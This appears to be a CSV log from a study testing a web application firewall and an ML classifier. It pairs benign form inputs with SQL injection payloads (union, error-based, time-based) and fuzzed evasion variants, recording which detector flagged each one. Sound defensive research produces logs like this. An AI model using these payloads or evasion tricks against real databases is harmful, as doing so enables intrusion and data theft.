Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
21,2024-12-16T21:09:34.761903,2.01871E+15,200,200,200,both_correct,"(SELECT/*@e614*/2).01871E+210
not like  AND 1",2024-12-16T21:09:35.410423,403,403,both_incorrect,"(seLEct 0x2).01871E+'YvI' LIKe 'YvI'
not like
 ANd (SELECT 1)",2024-12-16T21:09:38.583932,403,403,both_incorrect,"(seLEct/**/0x2).01871E+(seLEcT (SelecT 1))
not	like
 aND (sEleCT '''!=''I')",2024-12-16T21:09:42.570560,403,200,waf_incorrect_ml_correct,"(SElEct 0x2).01871E+(select (SelECT (SeLECt '[+' LIKE '[+')))
not	like
 aND (sELect	'''!=''I')",2024-12-16T21:09:47.246959,403,403,both_incorrect,"(SELECT/**/0x2).01871E+(sELeCT (SeleCt (SELEct '[+' liKe '[+')))
not
like
 ANd (SElEcT	'''!=''I')",2024-12-16T21:09:52.740647,403,403,both_incorrect
22,2024-12-16T21:09:58.670536,l1b6855ca30e,200,200,200,both_correct,l1b6855ca30e,2024-12-16T21:09:59.370150,200,200,both_correct,l1b6855ca30e,2024-12-16T21:10:01.053039,200,200,both_correct,l1b6855ca30e,2024-12-16T21:10:02.730026,200,200,both_correct,l1b6855ca30e,2024-12-16T21:10:04.446340,200,200,both_correct,l1b6855ca30e,2024-12-16T21:10:06.140124,200,200,both_correct
23,2024-12-16T21:10:07.837636,dierkop@hayunmundoahifuera.id,200,200,200,both_correct,dierkop@hayunmundoahifuera.id,2024-12-16T21:10:09.336286,200,200,both_correct,dierkop@hayunmundoahifuera.id,2024-12-16T21:10:11.818286,200,200,both_correct,dierkop@hayunmundoahifuera.id,2024-12-16T21:10:14.265181,200,200,both_correct,dierkop@hayunmundoahifuera.id,2024-12-16T21:10:16.735523,200,200,both_correct,dierkop@hayunmundoahifuera.id,2024-12-16T21:10:19.202406,200,200,both_correct
24,2024-12-16T21:10:21.684101,32806661j,200,200,200,both_correct,32806661j,2024-12-16T21:10:22.239253,200,200,both_correct,32806661j,2024-12-16T21:10:23.795916,200,200,both_correct,32806661j,2024-12-16T21:10:25.344258,200,200,both_correct,32806661j,2024-12-16T21:10:26.889497,200,200,both_correct,32806661j,2024-12-16T21:10:28.419718,200,200,both_correct
25,2024-12-16T21:10:29.982788,michell4@so-tel.jobs,200,200,200,both_correct,michell4@so-tel.jobs,2024-12-16T21:10:31.057445,200,200,both_correct,michell4@so-tel.jobs,2024-12-16T21:10:33.105099,200,200,both_correct,michell4@so-tel.jobs,2024-12-16T21:10:35.212632,200,200,both_correct,michell4@so-tel.jobs,2024-12-16T21:10:37.265583,200,200,both_correct,michell4@so-tel.jobs,2024-12-16T21:10:39.595480,200,200,both_correct
26,2024-12-16T21:10:41.716751,"1'+  (  select syrz where 7699  =  7699 union all select null,null,null#",403,403,403,both_correct,"1'+  (  SeLect
syrz wHERe 0x1e13   lIke    OR 4376 In (4375,4376,4377)/*_*/union all SELeCT null,null,null#",2024-12-16T21:10:45.185113,403,403,both_correct,"(selECT 1)'+  (  SElect
syrz
WhErE 0x1e13   LiKe    || 4376 in (4375, OR 3723 LIKE 3723,4377)/*E/2*/union/**/all sELECT null,null,null#",2024-12-16T21:10:51.253926,403,200,waf_correct_ml_incorrect,"(sElECt 1)'+  (  SEleCt
syrz
where 0x1e13	  like    || '4-' NOT LIKE '4-J' IN (0x1117, or 3723 LIkE (SELECT 1),4377)/*E/2*/union all sElECT null,null,null#",2024-12-16T21:10:58.636903,403,403,both_correct,"(SelecT 1)'+  (  SEleCt
syrz
where 0x1e13   like /**/  || '4-' NOT LIKE '9240!=9241-J' iN (0x1117, Or (seleCT 3723) likE (selEcT 1),4377)/*E/(SELECT 1)*/union all SeLeCT null,null,null#",2024-12-16T21:11:07.235186,403,403,both_correct,"(SeLeCT 1)'+ 
(  SEleCt
syrz
where 0x1e13   like    || '(SELECT 0x1)-' NOT LIKE '9240 NOT LIKE 9241-J' iN (0x1117, Or (seleCT 3723) likE (selEcT '\P'<>'\P\'),4377)/*E/(SELECT 1)*/union all sElEct null,null,null#",2024-12-16T21:11:16.908174,403,403,both_correct
27,2024-12-16T21:11:27.842952,-2797'   )    )     )   union all select 5711#,403,403,403,both_correct,"-2797' 
 )/**/   )     )   union all sEleCT 6820 not like  OR 0x0#-@",2024-12-16T21:11:30.287428,403,403,both_correct,"-0xaed' 
 )    )  
  )   union all SELeCT 4631<> AND 1 not like  OR 0x0#-@",2024-12-16T21:11:34.694580,403,403,both_correct,"-0xaed'   )   /**/)  
  )   union all selECt 0x1217<> &&  AND 1 NOT LIKE 4885 not like  oR 0x0#-@h!",2024-12-16T21:11:39.335916,403,403,both_correct,"-0xaed'   )   /**/)  
  )   union/**/all selECt 0x1217<> &&	 AND (SELECT 0x1) NOT LIKE 'CW'<>'CWm' not like  OR 0x0#-@h!",2024-12-16T21:11:45.128728,403,403,both_correct,"-0xaed'   )   /*
W(N*/)  
  )   union/**/all selECt 0x1217<>
&&	 AND (SELECT 0x1) NOT LIKE 'CW'<>'CWm' not like /**/Or 0x0#-@h!",2024-12-16T21:11:52.080042,403,403,both_correct
28,2024-12-16T21:11:59.268063,0 or 1  =  1,403,403,403,both_correct,"(seleCt 6789=6789) oR 1   like /**/
(sElEcT 1)",2024-12-16T21:12:00.002411,403,403,both_correct,"(SEleCt 6603 IN (6602,6603,(SELECT 6604))=6789) || 1   liKe  
(SElect
 OR 0)",2024-12-16T21:12:03.302695,403,403,both_correct,"(sELECt 6603 in ((SELECT '>7nN'<>'>7nNA'),6603,(SeLEct 6604))= AND 1)  or  1   LiKe/**/ 	(sELecT
 oR 0)",2024-12-16T21:12:08.062598,403,403,both_correct,"(SELeCt (seLeCt 6603) IN	((selEcT '>7nN' not like '>7nNA'),6603,(SELEct (seLEcT 1)))= aND 1)/**/ or  '$d' NOT LIKE '$d6'   like/**/ 	(SELECt
 Or 0)",2024-12-16T21:12:13.947418,403,403,both_correct,"(selecT (SeLECT 6603) in	((SeLEcT '>7nN' not like '>7nNA'), AnD 1,(select (selECT 3596=3596)))= AnD 1)/**//**/oR  '$d' not like '$d6'   LiKe/**/ 	(SelEcT	 Or (sEleCt 0))",2024-12-16T21:12:21.918323,403,403,both_correct
29,2024-12-16T21:12:31.171615,beln,200,200,200,both_correct,beln,2024-12-16T21:12:31.510946,200,200,both_correct,beln,2024-12-16T21:12:32.815310,200,200,both_correct,beln,2024-12-16T21:12:34.152426,200,200,both_correct,beln,2024-12-16T21:12:35.468176,200,200,both_correct,beln,2024-12-16T21:12:36.793865,200,200,both_correct
30,2024-12-16T21:12:38.121082,"calle gola de perellonet, 196,",200,200,200,both_correct,"calle	gola de perellonet, /**/AND '-\/'='-\/',",2024-12-16T21:12:39.667790,403,200,waf_incorrect_ml_correct,"calle
gola de perellonet,  anD '-\/' Like '-\/',",2024-12-16T21:12:42.954558,403,200,waf_incorrect_ml_correct,"calle
gola de	perellonet,/**/ && '-\/' likE '-\/',",2024-12-16T21:12:46.316440,403,200,waf_incorrect_ml_correct,"calle
gola/**/de perellonet,/**/  And  '-\/' LIkE '-\/',",2024-12-16T21:12:49.759667,403,200,waf_incorrect_ml_correct,"calle
gola/**/de/*>!_-*/perellonet,/**/  &&  '-\/' liKe
'-\/',",2024-12-16T21:12:53.524021,403,200,waf_incorrect_ml_correct
31,2024-12-16T21:12:57.540006,odonovan@piaceredelivery.ro,200,200,200,both_correct,odonovan@piaceredelivery.ro,2024-12-16T21:12:58.933828,200,200,both_correct,odonovan@piaceredelivery.ro,2024-12-16T21:13:01.496978,200,200,both_correct,odonovan@piaceredelivery.ro,2024-12-16T21:13:04.009521,200,200,both_correct,odonovan@piaceredelivery.ro,2024-12-16T21:13:06.372497,200,200,both_correct,odonovan@piaceredelivery.ro,2024-12-16T21:13:08.767537,200,200,both_correct
32,2024-12-16T21:13:11.152746,rozaln del monte,200,200,200,both_correct,"rozaln
del/**/monte",2024-12-16T21:13:12.014894,403,200,waf_incorrect_ml_correct,"rozaln/**/del/*^*/monte",2024-12-16T21:13:14.150019,200,200,both_correct,rozaln del/**/monte,2024-12-16T21:13:16.420815,200,200,both_correct,rozaln/**/del/*5T*/monte,2024-12-16T21:13:18.442814,200,200,both_correct,rozaln	del/*{ql*/monte,2024-12-16T21:13:20.767026,200,200,both_correct
33,2024-12-16T21:13:22.895536,37766,200,200,200,both_correct,(sELEct/**/7623 LiKe  or 0),2024-12-16T21:13:23.253701,403,200,waf_incorrect_ml_correct,"(SEleCt (SELECT 1)=611 like 
|| 0x0)",2024-12-16T21:13:25.696983,403,403,both_incorrect,"(sEleCT (SeleCt (Select 'r""' NOT LIKE 'r""K')) LIKE (sELEct 1)/**/LiKE 	|| 0x0)",2024-12-16T21:13:28.541235,403,403,both_incorrect,"(sElECT (seLecT (sElECt 'r""' NOT LIKE 'r""K')) Like (sElEct 'Ur;' NOT LIKE 'Ur;(SELECT  OR 0)') LiKE  || 0x0)",2024-12-16T21:13:33.324278,403,403,both_incorrect,"(SeLect/**/(seleCt (sELEcT 'r""' not like 'r""K')) lIkE	(sELEcT 'Ur;' NOT LIKE 'Ur;(SELECT  OR (SELECT 1976)<> AND 1)') like  || 0x0)",2024-12-16T21:13:39.809790,403,403,both_incorrect
34,2024-12-16T21:13:47.043593,deltell riberas,200,200,200,both_correct,deltell	riberas,2024-12-16T21:13:47.890771,200,200,both_correct,deltell riberas,2024-12-16T21:13:49.684230,200,200,both_correct,deltell/**/riberas,2024-12-16T21:13:51.502337,200,200,both_correct,"deltell
riberas",2024-12-16T21:13:53.474509,200,200,both_correct,deltell/**/riberas,2024-12-16T21:13:55.308001,200,200,both_correct
35,2024-12-16T21:13:57.276072,"1"" where 9632  =  9632 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",403,403,403,both_correct,"1"" where 9632  =  9632 anD row  (  0x185d,7469  )  >  (  seLeCt count  (  *  )  ,concat  (  0x7171706a71,  (  sELeCt   (  elt  (  6237   LIkE   6237,8238 IN (8237,8238,8239)   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x FROm   (  seLect (sELect 1) union sElecT 3785/**/union sElecT 3931
union sELeCT 7158  )  a group by x  )  --",2024-12-16T21:14:12.244170,403,200,waf_correct_ml_incorrect,"1"" wHerE 9632   likE   9632 ANd row  (  0x185d,7469  )  >  (  seLect count  (  *  )  ,concat  (  0x7171706a71,  (  SELeCt   (  elt  (  6237   LIKe   6237, AND 1 in (8237,8238,8239)   )    )     )  ,0x717a767a71,floor  (  rand  (  0x0  )  *2   )    )   x From   (  SeLecT (seleCT 1) union sElEct '2' NOT LIKE '2>' union seLecT 3931	union seLecT 7158  )  a group by x  )  --",2024-12-16T21:14:29.632834,403,403,both_correct,"1"" whEre 9632   LIKe    anD 1 aND row  (  0x185d,7469  )  >  (  seLect count  (  *  )  ,concat  (  0x7171706a71,  (  SeLECt   (  elt  (  6237   LiKe   6237, anD (SElEcT 1) In ('eV'='eV',8238,8239)   )    )     )  ,0x717a767a71,floor  (  rand  (  0x0  )  *2   )/**/   )   x FrOM   (  SELEcT (SELecT 1) union SElecT '2' NOT LIKE '2>' union SeleCT 3931 union SELecT 7158  )  a group by x  )  --",2024-12-16T21:14:48.357250,403,403,both_correct,"1"" wheRE 9632   LIKE    And 1 aND row  (  0x185d,7469  )  >  (  seLeCT count
 (  *  )  ,concat  (  0x7171706a71,  (  SELeCT   (  elt  (  6237   likE   6237, aNd (SElecT 1) iN ('eV' lIkE 'eV',8238,8239)   )    )     )  ,0x717a767a71,floor  (  rand  (  0x0  )  * And 1   )/**/   )  /*_*/x fRoM   (  SeLecT (sElEct 1) union SELeCt '844 LIKE 844' NOT LIKE '2>' union SelECT 3931 union seLECT 0x1bf6  )  a group by x  )  --",2024-12-16T21:15:08.045323,403,200,waf_correct_ml_incorrect,"'24'='24'"" WheRE  OR 0   likE    AND 1 AND row  (  0x185d,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  SELECt   (  elt  (  0x185d   LiKe   6237, && (SeleCT 1) iN ('eV' lIkE 'eV',8238,8239)   )    )     )  ,0x717a767a71,floor  (  rand  (  0x0  )  * anD 1   )    )  /**/x FROm   (  SElecT (sELeCt 1) union SELECT '844 LIKE 844' NOT LIKE '2>' union sELeCT 3931 union sElECt 0x1bf6  )  a group by x  )  --",2024-12-16T21:15:28.708412,403,403,both_correct
36,2024-12-16T21:15:49.773886,"1,  (  select   (  case when   (  3902  =  3902  )   then   (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   else 1/  (  select 0 from dual  )   end  )   from dual  )  ",403,403,403,both_correct,"1,  (  SeLEcT   (  cAse WHeN   (/**/ (selECt 3902)  =   or 0  )   Then   (  SELECt count  (  *  )   fRom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   elSe 1/  (  selECT 'qFa' NOT LIKE 'qFa_' fROM dual  )   ENd  ) 	 FROm dual  )  ",2024-12-16T21:16:00.106613,403,200,waf_correct_ml_incorrect,"1,  (  SeLECT   (  CaSe WHEN   (  (sElECt 3902)  =   or  oR 0  )   Then   (  SELEcT count  (  *  )   FroM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   ElSe (selEcT 9835) NOT LIKE 9836/  (  seLEct 'qFa' not like 'qFa_' fROM dual  )   EnD  )   froM dual  )  ",2024-12-16T21:16:13.217668,403,403,both_correct,"1,  (  sELECT   (  CAse wheN   (  (seLeCT 3902)  =   OR  Or 0  )   THen   (  sELeCT count  (  * /*R$y*/)   fROM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   Else (SELEct (SelEct 723) liKE (sEleCT 1)) NOT LIKE 9836/  (  SeLECT 'qFa' not like 'qFa_'	From dual  )   end  )   frOM dual  )  ",2024-12-16T21:16:27.303484,403,200,waf_correct_ml_incorrect,"(seLEct 4519 LIKE 4519),  (  sElEcT   (  CASe WHen   (  (selecT 3902)   like    or  oR 0  )   THEN   (  sElEcT count  (  * /**/)   FROM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   eLSe (SelEct (SELEcT/**/723) LIkE (selecT 0x1)) NOT	LIKE 9836/  (  SELeCt 'qFa' not like 'qFa_'	FROM dual  )   eNd  )   FRoM dual  )  ",2024-12-16T21:16:43.127035,403,403,both_correct,"(SELeCt 4519 likE 4519),  (  selECT   (  CASe wheN   (  (SElect  AND 1)   lIKe    oR  || (SELECT 0)  )   Then   (  sELECT count  (  *  )   froM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   ELSe (SelEct (sELeCt/*Zs*/723) liKE (SeLEct 0x1)) NOT	LIKE '$'!='$^'/  (  SelEct 'qFa' not like 'qFa_'
FrOM dual  )   EnD  )   FROM dual  )  ",2024-12-16T21:17:00.256547,403,200,waf_correct_ml_incorrect
37,2024-12-16T21:17:17.687675,19133,200,200,200,both_correct,0x188d=	or/**/0,2024-12-16T21:17:18.060929,200,200,both_correct,"0x188d=
Or/*yt/*/'(SELECT/**/2)' LiKE '(SELECT 1)'",2024-12-16T21:17:19.876686,403,403,both_incorrect,0x188d lIke 	or/*yt/*/'(SELECT 2)' LIKE '(SELECT (SELECT  AND 1<>7175))',2024-12-16T21:17:23.527660,403,403,both_incorrect,0x188d LIKe		Or/*yt/*/'(SELECT 2)' LIKE '(SELECT (SELECT  AND (SELECT 4554/**/NOT LIKE 4555)<> AND 1))',2024-12-16T21:17:27.977065,403,403,both_incorrect,0x188d lIKE	 oR/*yt/*/'(SELECT ' AND 1'!='1D')' Like '(SELECT (SELECT  AND (SELECT/**/4554/**/NOT LIKE 4555)<> AND (SELECT 1)))',2024-12-16T21:17:33.860541,403,403,both_incorrect
38,2024-12-16T21:17:41.019108,"1'   )    )    union all select null,null,null,null,null,null,null,null--",403,403,403,both_correct,"'T'!='TB'' 	 )    )   /**/union all selEct null,null,null,null,null,null,null,null--",2024-12-16T21:17:44.540444,403,403,both_correct,"'T' not like 'TB''   )    )    union all seLECT null,null,null,null,null,null,null,null--",2024-12-16T21:17:49.849253,403,403,both_correct,"'T' not like 'TB'' 
 ) /**/  )    union all selecT null,null,null,null,null,null,null,null--",2024-12-16T21:17:55.100319,403,403,both_correct,"'T' not like 'TB'' 	 )    )    union all sELeCT null,null,null,null,null,null,null,null--",2024-12-16T21:18:00.474891,403,403,both_correct,"'T' not/**/like 'TB''   )    )    union all SeLEcT null,null,null,null,null,null,null,null--",2024-12-16T21:18:05.813620,403,403,both_correct
39,2024-12-16T21:18:11.249662,a8ique0r4r,200,200,200,both_correct,a8ique0r4r,2024-12-16T21:18:11.848524,200,200,both_correct,a8ique0r4r,2024-12-16T21:18:13.422245,200,200,both_correct,a8ique0r4r,2024-12-16T21:18:15.010198,200,200,both_correct,a8ique0r4r,2024-12-16T21:18:16.608468,200,200,both_correct,a8ique0r4r,2024-12-16T21:18:18.197839,200,200,both_correct
40,2024-12-16T21:18:19.810168,"1'||  (  select 'kojx' from dual where 8140  =  8140 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",403,403,200,waf_correct_ml_incorrect,"1'||  (  select 'kojx' frOM dual WhEre 8140   like 
 8140/*1	*/AnD (SELEct 1)!=(SELECT 3611)  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",2024-12-16T21:18:25.842157,403,200,waf_correct_ml_incorrect,"1'||  (  select 'kojx' frOM dual wHeRE  Or 0   LiKe 	 8140/**/ANd (sElECt 7495 IN (7494,7495,7496)) NOT LIKE (seLeCT 3611)  =  benchmark  (  0x4c4b40,md5  (  0x6d457153   )    )/**/  #W",2024-12-16T21:18:34.226328,403,403,both_correct,"1'||  (  select 'kojx' fROm dual WherE  Or 'AO'!='AOP'   lIkE 	 8140 And (seLECt 0x1d47 In (7494, AND 1,7496)) not like (sElEcT 3611)  =  benchmark 	(  0x4c4b40,md5  (  0x6d457153   )    )/**/  #W",2024-12-16T21:18:43.986411,403,200,waf_correct_ml_incorrect,"(SELECT 1)'||  (  select 'kojx' fROm dual WherE  Or 'AO'!='AOP'   lIkE 	 8140 And (seLECt/**/0x1d47 In ('M,
t' NOT LIKE 'M,
t_', ANd 1,7496)) not like	(selECt  or 0)   LIKE   benchmark 	(  0x4c4b40,md5  (  0x6d457153   )    )/*y^9p*/  #W",2024-12-16T21:18:54.352500,403,200,waf_correct_ml_incorrect,"(selEcT 1)'||  (  select 'kojx' fROm dual WherE  Or 'AO'!='AOP'   lIkE 	  OR 0 And (seLECt 0x1d47 In ('M,	t' NOT LIKE 'M,
t_', aND 4169 LIKE 4169,(seLEct 7496))) not like	(sEleCT  or 0)   LIKe   benchmark 	(  0x4c4b40,md5  (  0x6d457153   )    )/*y^9p*/  #Wl",2024-12-16T21:19:06.573578,403,200,waf_correct_ml_incorrect
41,2024-12-16T21:19:19.994785,1  )   as sdnd where 9472  =  9472,403,403,200,waf_correct_ml_incorrect, or 0/**/ )   As sdnd wHerE '=' not like '=Y' 	=  0x2500,2024-12-16T21:19:21.745709,200,403,waf_incorrect_ml_correct," Or (SELECT 8946) like  OR 0/*
9*/ )   AS sdnd wHerE '='/**/not like '=Y'  =  0x2500",2024-12-16T21:19:25.418079,200,403,waf_incorrect_ml_correct," oR (SeLecT  OR 0) lIkE/**/ || (sELeCt 3053)!=3054/*
9*/ )	  as sdnd WHere '='/**/not like '=Y'  =  0x2500",2024-12-16T21:19:30.499673,403,200,waf_correct_ml_incorrect," oR (SEleCT  oR 3264=(SeLECt 1)) LIKe  || (sElEcT 3053)<>0xbee/*
9*/ )
  as sdnd whEre '='/**/not like '=Y'  =  0x2500",2024-12-16T21:19:36.579814,403,403,both_correct," Or (SeLEcT  or 'j'' NOT LIKE 'j'S' like (sElEcT 1)) LiKe  || (SElEct 3053)<>0xbee/*
(SELECT 0x1)*/ )
  aS sdnd wHeRE '=' not like	'=Y'  =  0x2500",2024-12-16T21:19:43.401506,403,403,both_correct
42,2024-12-16T21:19:51.160629,"1%'  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  '%'  =  '",403,403,200,waf_correct_ml_incorrect,"'6;X`' NOT LIKE '6;X`p'%'  )   or char  (  117  )  ||char  (  111  )  ||char  (  (SELECT 105)  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65	 )/**/ ||char  (  69  )  ||char  (  83  )  ,null  )  ,(SELECT 1)  )  ,500000000  )  ,null  )   and   (  '%'  =  '",2024-12-16T21:20:03.404158,200,403,waf_incorrect_ml_correct,"'6;X`' not like '6;X`p'%'  )   or char  (  117  )  ||char /**/(  111  )  ||char  (  (SELECT 0x69)  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )/**/ ||char  (  69  )  ||char  (  (SELECT 1)  )  ,null  )  ,(SELECT 1686<>1687)  )  ,500000000  )  ,null  )   and   (  '%'  =  '",2024-12-16T21:20:18.784326,200,403,waf_incorrect_ml_correct,"'6;X`' not like '6;X`p'%'  )   or char  (  117  )  ||char /**/(  (SELECT 111)  )  ||char  (  (SELECT 0x69)  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (	 69  )  ||char  (  (SELECT (SELECT 1))  )  ,null  )  ,(SELECT 308!=309<>1687)  )  ,500000000  )  ,null  )   and   (  '%'  =  '",2024-12-16T21:20:35.230014,200,403,waf_incorrect_ml_correct,"'6;X`' not like '6;X`p'%'  )   or char  (  (SELECT 1)  )  ||char /**/(  (SELECT 111)  )  ||char/**/ (  (SELECT 0x69)  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (
 69  )  ||char  (  (SELECT (SELECT 1))  )  ,null  )  ,(SELECT 6767=(SELECT 6767)!=309<>1687)  )  ,500000000  )  ,null  )   and   (  '%'  =  '",2024-12-16T21:20:52.444142,200,403,waf_incorrect_ml_correct,"'6;X`' not like '6;X`p'%'  )   or char  (  (SELECT 1)  )  ||char /*jy$>*/(  (SELECT (SELECT '4' LIKE '4'))  )  ||char/**/ (  (SELECT 0x69)  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (	 69  )  ||char  (  (SELECT (SELECT 1))  )  ,null  )  ,(SELECT 6767=(SELECT 6767)!=309<>1687)/**/ )  ,0x1dcd6500  )  ,null  )   and   (  '%'  =  '",2024-12-16T21:21:11.040423,403,403,both_correct
43,2024-12-16T21:21:30.712079,kaycee,200,200,200,both_correct,kaycee,2024-12-16T21:21:31.124932,200,200,both_correct,kaycee,2024-12-16T21:21:32.541889,200,200,both_correct,kaycee,2024-12-16T21:21:33.963407,200,200,both_correct,kaycee,2024-12-16T21:21:35.388111,200,200,both_correct,kaycee,2024-12-16T21:21:36.807086,200,200,both_correct
44,2024-12-16T21:21:38.219484,"1,iif  (  7475  =  7475,1,1/0  )  ",403,403,200,waf_correct_ml_incorrect,"1,iif  (  7475   like
  (seLEct 1),(SELECT 1),1/'j'!='j1'  ) /*Y*/",2024-12-16T21:21:39.874677,403,403,both_correct,"1,iif 	( /**/7475   like
  (sEleCT 7403 iN (7402,(sELEct 1),7404)),(SELEct 1),(SELeCt 1)/'j'!='j1'  ) /**/",2024-12-16T21:21:44.103178,403,200,waf_correct_ml_incorrect,"1,iif  ( /**/(SELECT 7475)   LIkE
  (seLeCT 7403 In (7402,(sElEct  aND 1),1776<>1777)),(SeLeCT 1),(SelecT 1)/'j'<>'j1'  )  ",2024-12-16T21:21:50.520610,403,200,waf_correct_ml_incorrect,"1,iif  (  (SElECT 7475)   liKE
  (seLEct 7403 in (7402,(sELEct  aNd 1),0x6f0 not like 1777)),(SeLEct  AND 1),(SeLeCt '-iv' LIKE '-iv')/'j'<>'j1' 
)  ",2024-12-16T21:21:57.286705,403,403,both_correct,"0x1,iif  (  (SeleCT 7475)   likE
  (sELeCT (SELeCt 9188 LIKE 9188) In (7402,(seLeCT  aNd 1),0x6f0 not like 1777)),(SeLeCt  AND 1),(SEleCt '-iv'/*=<@a*/liKE '-iv')/'j'<>'j1' 
)
 ",2024-12-16T21:22:05.297002,403,200,waf_correct_ml_incorrect
45,2024-12-16T21:22:14.812032,fajardos espuna,200,200,200,both_correct,fajardos/**/espuna,2024-12-16T21:22:15.748188,200,200,both_correct,fajardos espuna,2024-12-16T21:22:17.718880,200,200,both_correct,"fajardos
espuna",2024-12-16T21:22:19.542175,200,200,both_correct,fajardos	espuna,2024-12-16T21:22:21.410081,200,200,both_correct,fajardos espuna,2024-12-16T21:22:23.241096,200,200,both_correct
